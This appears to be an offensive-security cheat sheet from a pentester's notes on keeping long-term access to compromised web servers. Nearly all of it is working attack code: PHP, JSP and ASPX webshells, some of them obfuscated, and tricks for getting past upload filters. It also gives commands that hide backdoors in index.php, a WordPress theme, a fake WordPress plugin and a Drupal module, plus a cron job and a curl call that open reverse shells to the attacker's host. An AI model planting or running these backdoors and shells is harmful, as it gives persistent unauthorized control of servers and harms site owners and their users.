# Web Persistence

**Tags:** #persistence #webshell #web #post-exploitation
**Phase:** Post-Initial-Access → Long-Term Web Access

---

## PHP Webshells

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php passthru($_POST['c']); ?>
<?php eval(base64_decode($_POST['e'])); ?>

# More evasive
<?php $f=$_POST['f'];$f(${"_PO"."ST"}['a']);?>
<?php @assert($_POST['cmd']); ?>

# Obfuscated
<?php $x=base64_decode('c3lzdGVt');$x($_GET['cmd']);?>

# Usage after upload
curl "http://$TARGET/uploads/shell.php?cmd=id"
curl -X POST "http://$TARGET/shell.php" -d "c=id"
```

## JSP Webshell (Java/Tomcat)

```jsp
<%@ page import="java.io.*,java.util.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line; StringBuilder sb = new StringBuilder();
    while((line=br.readLine())!=null) sb.append(line).append("<br>");
    out.print(sb.toString());
%>
```

## ASPX Webshell (.NET/IIS)

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% 
string cmd = Request.QueryString["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
%>
```

## Upload Bypass Techniques

```bash
# Extension bypass — try all on the target server
shell.php
shell.php5
shell.php7
shell.phtml
shell.phar
shell.php.jpg      # Double extension
shell.php%00.jpg   # Null byte (old PHP)
shell.PHP          # Case variation

# MIME type bypass
curl -F "file=@shell.php;type=image/jpeg" http://$TARGET/upload.php

# Magic bytes injection (prepend GIF89a)
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
```

## .htaccess Backdoor (Apache)

```bash
# Upload .htaccess to make Apache execute files as PHP
echo "AddType application/x-httpd-php .jpg" > .htaccess
# Then upload shell.jpg containing PHP code
```

## Backdoor Injection into Existing Files

```bash
# Append to existing PHP file (hard to find)
echo '<?php if(isset($_REQUEST["x"])){system($_REQUEST["x"]);} ?>' >> index.php

# Inject into WordPress theme
echo '<?php system($_GET["cmd"]); ?>' >> /var/www/html/wp-content/themes/twentytwenty/functions.php

# Hidden cron-based shell
echo '<?php $sock=fsockopen("'$LHOST'",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' >> /var/www/cgi/cronjob.php
(crontab -l; echo "*/5 * * * * curl -s http://localhost/cgi/cronjob.php") | crontab -
```

## CMS Specific Backdoors

### WordPress

```bash
# Create plugin backdoor
mkdir /var/www/html/wp-content/plugins/wp-helper
cat > /var/www/html/wp-content/plugins/wp-helper/wp-helper.php << 'WPEOF'
<?php
/*Plugin Name: WordPress Helper*/
if(isset($_GET['x'])) system($_GET['x']);
WPEOF
# Activate via WP admin or directly (auto-activates on inclusion)
```

### Drupal

```bash
# Module backdoor
mkdir /var/www/html/sites/all/modules/helper
cat > /var/www/html/sites/all/modules/helper/helper.module << 'DEOF'
<?php
function helper_menu() {
  $items['admin/helper'] = array('page callback' => 'helper_go', 'access callback' => TRUE);
  return $items;
}
function helper_go() { system($_GET['c']); }
DEOF
```

## Access Hidden Webshell

```bash
# Direct access
curl "http://$TARGET/uploads/shell.php?cmd=whoami"

# POST method (stealthier)
curl -X POST "http://$TARGET/shell.php" -d "cmd=id"

# Reverse shell from webshell
curl "http://$TARGET/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/$LHOST/4444%200>%261'"
```

## Related Notes

- [[07-Web-Application/File-Upload]] — File upload exploitation
- [[08-Persistence/Linux-Persistence]] — OS-level persistence
- [[00-Quick-Reference/Reverse-Shells]] — Shell payloads
